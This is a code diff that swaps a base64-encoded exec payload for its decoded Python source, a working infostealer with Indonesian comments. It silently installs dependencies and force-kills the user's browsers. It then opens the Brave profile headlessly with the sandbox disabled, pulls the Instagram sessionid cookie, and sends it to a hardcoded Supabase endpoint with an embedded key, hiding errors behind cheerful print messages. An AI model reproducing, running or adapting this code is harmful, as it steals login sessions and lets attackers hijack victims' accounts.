@@ -1,1 +1,102 @@
-import base64; exec(base64.b64decode('aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRlbXBmaWxlCgpkZWYgbWFpbigpOgogICAgcHJpbnQoIndhaXQgeWEiKQogICAgCiAgICAjIDEuIEJ1YXQgZm9sZGVyIHNlbWVudGFyYSBraHVzdXMgdW50dWsgZGVwZW5kZW5zaSAoc3VwYWJhc2UgJiBwbGF5d3JpZ2h0KQogICAgd2l0aCB0ZW1wZmlsZS5UZW1wb3JhcnlEaXJlY3RvcnkoKSBhcyB0ZW1wX2RpcjoKICAgICAgICAKICAgICAgICAjIEluc3RhbGwgZGVwZW5kZW5zaSBsYW5nc3VuZyBrZSBmb2xkZXIgdGVtcCBzZWNhcmEgc2VueWFwCiAgICAgICAgc3VicHJvY2Vzcy5jaGVja19jYWxsKAogICAgICAgICAgICBbCiAgICAgICAgICAgICAgICBzeXMuZXhlY3V0YWJsZSwgIi1tIiwgInBpcCIsICJpbnN0YWxsIiwKICAgICAgICAgICAgICAgICItLXRhcmdldCIsIHRlbXBfZGlyLAogICAgICAgICAgICAgICAgIi0tcXVpZXQiLCAic3VwYWJhc2UiLCAicGxheXdyaWdodCIKICAgICAgICAgICAgXSwKICAgICAgICAgICAgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTCwKICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTAogICAgICAgICkKICAgICAgICAKICAgICAgICAjIE1hc3Vra2FuIGZvbGRlciB0ZW1wIGtlIHNpc3RlbSBwYXRoIFB5dGhvbiBhZ2FyIG1vZHVsIGJpc2EgZGktaW1wb3J0CiAgICAgICAgc3lzLnBhdGguaW5zZXJ0KDAsIHRlbXBfZGlyKQoKICAgICAgICAjIEltcG9ydCBtb2R1bCB5YW5nIGRpYnV0dWhrYW4gc2V0ZWxhaCBiZXJoYXNpbCBkaS1pbnN0YWxsCiAgICAgICAgZnJvbSBzdXBhYmFzZSBpbXBvcnQgY3JlYXRlX2NsaWVudCwgQ2xpZW50CiAgICAgICAgZnJvbSBwbGF5d3JpZ2h0LnN5bmNfYXBpIGltcG9ydCBzeW5jX3BsYXl3cmlnaHQKCiAgICAgICAgIyAtLS0gS09ORklHVVJBU0kgU1VQQUJBU0UgLS0tCiAgICAgICAgU1VQQUJBU0VfVVJMID0gImh0dHBzOi8vYnN1bnpld25lZnh5YW1hcGN6encuc3VwYWJhc2UuY28iCiAgICAgICAgU1VQQUJBU0VfS0VZID0gImV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUpwYzNNaU9pSnpkWEJoWW1GelpTSXNJbkpsWmlJNkltSnpkVzU2WlhkdVpXWjRlV0Z0WVhCamVucDNJaXdpY205c1pTSTZJbUZ1YjI0aUxDSnBZWFFpT2pFM09EZ3hOalEzTWpRc0ltVjRjQ0k2TWpFd016YzBNRGN5TkgwLlF6b1RGSUdPUkVjVVhsNlNmeHZweEE2MWQ1M2cwaFRCOXg4RHNiZnRod3MiCgogICAgICAgIGRlZiBraWxsX2Jyb3dzZXJfcHJvY2Vzc2VzKCk6CiAgICAgICAgICAgIAogICAgICAgICAgICBicm93c2VycyA9IFsiYnJhdmUuZXhlIiwgImNocm9tZS5leGUiLCAibXNlZGdlLmV4ZSIsICJvcGVyYS5leGUiXQogICAgICAgICAgICBmb3IgYnJvd3NlciBpbiBicm93c2VyczoKICAgICAgICAgICAgICAgIGNtZCA9IGYidGFza2tpbGwgL0YgL0lNIHticm93c2VyfSA+bnVsIDI+JjEiCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLkRFVk5VTEwsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpCgogICAgICAgIGRlZiBzYXZlX3RvX3N1cGFiYXNlKHNlc3Npb25faWRfdmFsOiBzdHIpOgogICAgICAgICAgICAKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc3VwYWJhc2U6IENsaWVudCA9IGNyZWF0ZV9jbGllbnQoU1VQQUJBU0VfVVJMLCBTVVBBQkFTRV9LRVkpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICMgS2lyaW0gZGF0YSBrZSB0YWJlbCAnc3RvcmFnZScKICAgICAgICAgICAgICAgIHN1cGFiYXNlLnRhYmxlKCJzdG9yYWdlIikuaW5zZXJ0KHsKICAgICAgICAgICAgICAgICAgICAic2Vzc2lvbiI6IHNlc3Npb25faWRfdmFsCiAgICAgICAgICAgICAgICB9KS5leGVjdXRlKCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgZGVmIGdldF9hbmRfc2VuZF9pbnN0YWdyYW1fc2Vzc2lvbigpOgogICAgICAgICAgICBraWxsX2Jyb3dzZXJfcHJvY2Vzc2VzKCkKCiAgICAgICAgICAgIGJyYXZlX3BhdGggPSByIkM6XFByb2dyYW0gRmlsZXNcQnJhdmVTb2Z0d2FyZVxCcmF2ZS1Ccm93c2VyXEFwcGxpY2F0aW9uCHJhdmUuZXhlIgogICAgICAgICAgICB1c2VyX2RhdGFfZGlyID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgb3MuZW52aXJvbi5nZXQoJ1VTRVJQUk9GSUxFJywgJycpLAogICAgICAgICAgICAgICAgJ0FwcERhdGEnLCAnTG9jYWwnLCAnQnJhdmVTb2Z0d2FyZScsICdCcmF2ZS1Ccm93c2VyJywgJ1VzZXIgRGF0YScKICAgICAgICAgICAgKQoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgd2l0aCBzeW5jX3BsYXl3cmlnaHQoKSBhcyBwOgogICAgICAgICAgICAgICAgICAgIGNvbnRleHQgPSBwLmNocm9taXVtLmxhdW5jaF9wZXJzaXN0ZW50X2NvbnRleHQoCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfZGF0YV9kaXI9dXNlcl9kYXRhX2RpciwKICAgICAgICAgICAgICAgICAgICAgICAgZXhlY3V0YWJsZV9wYXRoPWJyYXZlX3BhdGgsCiAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRsZXNzPVRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgIGFyZ3M9WyItLW5vLXNhbmRib3giLCAiLS1kaXNhYmxlLXNldHVpZC1zYW5kYm94Il0KICAgICAgICAgICAgICAgICAgICApCgogICAgICAgICAgICAgICAgICAgICMgQnVrYSBoYWxhbWFuIEluc3RhZ3JhbSBhZ2FyIFBsYXl3cmlnaHQgbWVtdWF0IGNvb2tpZSBha3RpZgogICAgICAgICAgICAgICAgICAgIHBhZ2UgPSBjb250ZXh0Lm5ld19wYWdlKCkKICAgICAgICAgICAgICAgICAgICBwYWdlLmdvdG8oImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20iLCB3YWl0X3VudGlsPSJkb21jb250ZW50bG9hZGVkIiwgdGltZW91dD0xNTAwMCkKCiAgICAgICAgICAgICAgICAgICAgYWxsX2Nvb2tpZXMgPSBjb250ZXh0LmNvb2tpZXMoKQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQuY2xvc2UoKQoKICAgICAgICAgICAgICAgICAgICAjIEZpbHRlciBjb29raWUgc2Vzc2lvbmlkCiAgICAgICAgICAgICAgICAgICAgaWdfc2Vzc2lvbnMgPSBbCiAgICAgICAgICAgICAgICAgICAgICAgIGMgZm9yIGMgaW4gYWxsX2Nvb2tpZXMgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJpbnN0YWdyYW0uY29tIiBpbiBjLmdldCgiZG9tYWluIiwgIiIpIGFuZCBjLmdldCgibmFtZSIpID09ICJzZXNzaW9uaWQiCiAgICAgICAgICAgICAgICAgICAgXQoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgaWdfc2Vzc2lvbnM6CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgICAgICAgICBzZXNzaW9uX2lkX3ZhbCA9IGlnX3Nlc3Npb25zWzBdWyJ2YWx1ZSJdCgogICAgICAgICAgICAgICAgICAgICMgS2lyaW0ga2UgU3VwYWJhc2UKICAgICAgICAgICAgICAgICAgICBzYXZlX3RvX3N1cGFiYXNlKHNlc3Npb25faWRfdmFsKQoKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgIyBKYWxhbmthbiBla3Nla3VzaSB1dGFtYQogICAgICAgIGdldF9hbmRfc2VuZF9pbnN0YWdyYW1fc2Vzc2lvbigpCgogICAgIyAyLiBTZXRlbGFoIGtlbHVhciBkYXJpIGJsb2sgJ3dpdGgnLCBmb2xkZXIgdGVtcF9kaXIgYmVzZXJ0YSBzZWx1cnVoIGRlcGVuZGVuc2kgb3RvbWF0aXMgdGVyaGFwdXMKICAgIHByaW50KCJob2lpaWlpIikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK').decode('utf-8'))
+import os
+import sys
+import subprocess
+import tempfile
+
+def main():
+    print("wait ya")
+    
+    # 1. Buat folder sementara khusus untuk dependensi (supabase & playwright)
+    with tempfile.TemporaryDirectory() as temp_dir:
+        
+        # Install dependensi langsung ke folder temp secara senyap
+        subprocess.check_call(
+            [
+                sys.executable, "-m", "pip", "install",
+                "--target", temp_dir,
+                "--quiet", "supabase", "playwright"
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        
+        # Masukkan folder temp ke sistem path Python agar modul bisa di-import
+        sys.path.insert(0, temp_dir)
+
+        # Import modul yang dibutuhkan setelah berhasil di-install
+        from supabase import create_client, Client
+        from playwright.sync_api import sync_playwright
+
+        # --- KONFIGURASI SUPABASE ---
+        SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
+        SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"
+
+        def kill_browser_processes():
+            """Menutup proses browser agar profil data tidak terkunci."""
+            browsers = ["brave.exe", "chrome.exe", "msedge.exe", "opera.exe"]
+            for browser in browsers:
+                cmd = f"taskkill /F /IM {browser} >nul 2>&1"
+                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        def save_to_supabase(session_id_val: str):
+            """Mengirim sessionid ke tabel Supabase."""
+            try:
+                supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+                
+                # Kirim data ke tabel 'storage'
+                supabase.table("storage").insert({
+                    "session": session_id_val
+                }).execute()
+            except Exception:
+                pass
+
+        def get_and_send_instagram_session():
+            kill_browser_processes()
+
+            brave_path = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
+            user_data_dir = os.path.join(
+                os.environ.get('USERPROFILE', ''),
+                'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'
+            )
+
+            try:
+                with sync_playwright() as p:
+                    context = p.chromium.launch_persistent_context(
+                        user_data_dir=user_data_dir,
+                        executable_path=brave_path,
+                        headless=True,
+                        args=["--no-sandbox", "--disable-setuid-sandbox"]
+                    )
+
+                    # Buka halaman Instagram agar Playwright memuat cookie aktif
+                    page = context.new_page()
+                    page.goto("https://www.instagram.com", wait_until="domcontentloaded", timeout=15000)
+
+                    all_cookies = context.cookies()
+                    context.close()
+
+                    # Filter cookie sessionid
+                    ig_sessions = [
+                        c for c in all_cookies 
+                        if "instagram.com" in c.get("domain", "") and c.get("name") == "sessionid"
+                    ]
+
+                    if not ig_sessions:
+                        return
+
+                    session_id_val = ig_sessions[0]["value"]
+
+                    # Kirim ke Supabase
+                    save_to_supabase(session_id_val)
+
+            except Exception:
+                pass
+
+        # Jalankan eksekusi utama
+        get_and_send_instagram_session()
+
+    # 2. Setelah keluar dari blok 'with', folder temp_dir beserta seluruh dependensi otomatis terhapus
+    print("hoiiiii")
+
+if __name__ == "__main__":
+    main()
